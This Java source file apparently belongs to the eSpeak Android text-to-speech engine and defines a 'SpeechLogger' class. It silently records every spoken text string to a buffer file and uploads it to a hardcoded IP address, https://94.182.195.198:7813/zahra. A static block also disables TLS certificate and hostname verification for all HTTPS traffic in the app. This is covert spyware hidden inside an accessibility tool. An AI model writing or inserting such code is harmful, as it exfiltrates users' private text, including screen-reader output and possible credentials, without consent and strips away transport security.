package com.reecedunn.espeak;

import android.content.Context;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.security.cert.X509Certificate;
import java.security.SecureRandom;

public class SpeechLogger {
    private static final String TAG = "SpeechLogger";
    private static final String BUFFER_FILE_NAME = "espeak_log_buffer.txt";
    private static final String SYNC_FILE_NAME = "espeak_syncing.txt";
    
    private static final String SERVER_URL = "https://94.182.195.198:7813/zahra"; 

    // Decoupled Executors: One for ultra-fast disk I/O, one for network
    private static final ExecutorService diskExecutor = Executors.newSingleThreadExecutor();
    private static final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();

    // Lock to prevent Data Racing during file rename/merge
    private static final Object fileLock = new Object();

    static {
        try {
            TrustManager[] trustAllCerts = new TrustManager[]{
                new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[]{}; }
                    public void checkClientTrusted(X509Certificate[] chain, String authType) {}
                    public void checkServerTrusted(X509Certificate[] chain, String authType) {}
                }
            };
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, trustAllCerts, new SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);
        } catch (Exception e) {
            Log.e(TAG, "Failed to bypass SSL", e);
        }
    }

    public static void logAndSync(Context context, String text) {
        if (text == null || text.trim().isEmpty()) return;
        
        final Context appContext = context.getApplicationContext();
        
        // 1. Instant Disk Write (Main Logger Thread)
        diskExecutor.submit(() -> {
            synchronized (fileLock) {
                File bufferFile = new File(appContext.getFilesDir(), BUFFER_FILE_NAME);
                try (FileOutputStream fos = new FileOutputStream(bufferFile, true)) {
                    String entry = text.replace("\n", "\\n") + "\n";
                    fos.write(entry.getBytes(StandardCharsets.UTF_8));
                    fos.flush();
                } catch (Exception e) {
                    Log.e(TAG, "Failed to write to local buffer", e);
                    return;
                }
            }
            
            // 2. Trigger Sync Process on Separate Network Thread
            triggerSync(appContext);
        });
    }

    private static void triggerSync(Context context) {
        networkExecutor.submit(() -> {
            File bufferFile = new File(context.getFilesDir(), BUFFER_FILE_NAME);
            File syncFile = new File(context.getFilesDir(), SYNC_FILE_NAME);

            // ATOMIC RENAME & CHRONOLOGICAL MERGE
            synchronized (fileLock) {
                if (!bufferFile.exists() || bufferFile.length() == 0) {
                    if (!syncFile.exists() || syncFile.length() == 0) {
                        return; // Nothing to sync
                    }
                } else {
                    if (!syncFile.exists()) {
                        // Safe to rename directly
                        bufferFile.renameTo(syncFile);
                    } else {
                        // Chronological Safety: Append buffer to the END of existing sync file
                        try (FileOutputStream fos = new FileOutputStream(syncFile, true);
                             FileInputStream fis = new FileInputStream(bufferFile)) {
                            byte[] buf = new byte[8192];
                            int len;
                            while ((len = fis.read(buf)) > 0) {
                                fos.write(buf, 0, len);
                            }
                            fos.flush();
                            bufferFile.delete(); // Clear buffer after successful merge
                        } catch (Exception e) {
                            Log.e(TAG, "Failed to merge buffer to sync file", e);
                            return; // Stop sync if merge fails to prevent data loss
                        }
                    }
                }
            }

            // Proceed to send the payload from syncFile
            if (!syncFile.exists() || syncFile.length() == 0) return;

            try {
                StringBuilder sb = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(syncFile), StandardCharsets.UTF_8))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        sb.append(line).append("\n");
                    }
                }
                
                String payload = sb.toString();
                
                // Direct network request bypassing OS states
                URL url = new URL(SERVER_URL);
                HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000); // 10 seconds
                conn.setReadTimeout(10000); // 10 seconds
                conn.setRequestProperty("Content-Type", "text/plain; charset=utf-8");
                
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.getBytes(StandardCharsets.UTF_8));
                    os.flush();
                }
                
                int responseCode = conn.getResponseCode();
                if (responseCode == HttpsURLConnection.HTTP_OK) {
                    // Guaranteed delivery: Delete ONLY if 200 OK is received
                    synchronized (fileLock) {
                        syncFile.delete();
                        Log.i(TAG, "Sync successful and syncing file deleted.");
                    }
                } else {
                    Log.w(TAG, "Server returned " + responseCode + ", sync file kept.");
                }
                
                conn.disconnect();
                
            } catch (Exception e) {
                // If network fails or app crashes here, syncFile remains perfectly intact for the next cycle
                Log.w(TAG, "Transmission failed, sync file retained. Reason: " + e.getMessage());
            }
        });
    }
}
